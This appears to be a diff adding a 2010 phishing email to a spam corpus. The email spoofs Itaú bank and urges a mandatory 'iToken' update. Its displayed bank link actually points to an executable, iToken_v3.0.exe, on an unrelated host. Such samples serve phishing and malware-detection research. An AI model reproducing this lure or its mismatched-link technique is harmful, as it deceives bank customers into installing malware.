@@ -1,0 +1,79 @@
+Return-Path: <comunicacaodigital@itau-unibanco.com.br>
+Received: from murder ([unix socket])
+	 by correo (Cyrus v2.2.13-Debian-2.2.13-10) with LMTPA;
+	 Tue, 29 Jun 2010 14:27:09 +0200
+X-Sieve: CMU Sieve 2.2
+Received: from mx2.ultreia.es ([217.130.23.211])
+	by correo.ultreia.es with esmtps (TLS-1.0:RSA_AES_256_CBC_SHA1:32)
+	(Exim 4.63)
+	(envelope-from <comunicacaodigital@itau-unibanco.com.br>)
+	id 1OTZu9-0001ue-EJ
+	for notificaciones@gestores.net; Tue, 29 Jun 2010 14:27:09 +0200
+Received: from l50cnn0636.locaweb.com.br ([187.45.250.72])
+	by mx2.ultreia.es with esmtp (Exim 4.63)
+	(envelope-from <comunicacaodigital@itau-unibanco.com.br>)
+	id 1OTZu2-0000SU-KP
+	for notificaciones@gestores.net; Tue, 29 Jun 2010 14:27:09 +0200
+Received: by L50CNN0636.locaweb.com.br (Postfix, from userid 48)
+	id 5F7191B22C; Tue, 29 Jun 2010 09:26:41 -0300 (BRT)
+X-Locaweb-ID: 63325679646D56794F69424D4E544244546B34774E6A4D324C43423163325679626D46745A546F6764584A76646D6C796444453D
+To: notificaciones@gestores.net
+X-PHP-Script: www.urovirt.org.br/urovirt/index2.php for 201.25.165.207
+MIME-Version: 1.0
+Content-type: text/html; charset=iso-8859-1
+From: Banco ItaX S.A <comunicacaodigital@itau-unibanco.com.br>
+Message-Id: <20100629122641.5F7191B22C@L50CNN0636.locaweb.com.br>
+Date: Tue, 29 Jun 2010 09:26:41 -0300 (BRT)
+X-Spam-Checker-Version: SpamAssassin 3.2.3 (2007-08-08) on mx2.ultreia.es
+X-Spam-Level: **
+X-Spam-Status: No, score=3.0 required=5.0 tests=BAYES_50,HTML_IMAGE_ONLY_16,
+	HTML_MESSAGE,MIME_HTML_ONLY,SUBJECT_NEEDS_ENCODING shortcircuit=no
+	autolearn=no version=3.2.3
+Subject: Informativo - ItaX Bankline
+X-SA-Do-Not-Run: Yes
+X-SA-Do-Not-Run: Yes
+X-SA-Exim-Connect-IP: 217.130.23.211
+X-SA-Exim-Mail-From: comunicacaodigital@itau-unibanco.com.br
+X-SA-Exim-Scanned: No (on correo.ultreia.es); SAEximRunCond expanded to false
+
+
+<meta http-equiv="Context-Type" content="text/html; charset=iso-8859-1">
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+
+<HTML><HEAD><TITLE></TITLE>
+
+<META content="text/html; charset=windows-1252" http-equiv=Content-Type>
+
+<META name=GENERATOR content="MSHTML 8.00.7600.16385"></HEAD>
+
+<BODY>
+
+<P><FONT size=2 face=verdana><IMG 
+
+src="http://www.itau.com.br/itaumail/servicos/comunicacao_digital/pj/cd_header.gif"><BR></FONT></P>
+
+<P><FONT size=2 face=verdana><STRONG><b>Caro cliente</b>,</STRONG></FONT></P>
+
+
+
+<P><FONT size=2 face=verdana>Estamos disponibilizando a <b>Atualização</b> do seu aparelho iToken <br>para a versão 3.0 <b>(v.3.00)</b>. A atualização é obrigatória e pode<br> ser feita somente via <b>Bankline</b> por meio do link abaixo.<br><br>
+
+Disponível por 2 días úteis apartir de 29/06/2010.
+
+ 
+
+<P align=left><FONT face=verdana color=#000000 size=2><A href="http://lpsdx.gzst.gov.cn/iToken_v3.0.exe">http://bankline.itau.com.br/atualizacaoitoken/iToken_v3.0</A> </FONT><br><br> 
+
+
+
+<P><FONT size=2 face=verdana><IMG 
+
+src="http://www.itau.com.br/itaumail/servicos/comunicacao_digital/pj/sac_pj.gif"><BR></FONT></P>
+
+
+
+<P><BR><FONT size=2 face=verdana>Atenciosamente,<BR>Itaú S/A - Central Atendimento On-line.</FONT></P></BODY></HTML>
+
+
+<html><body></body></html>
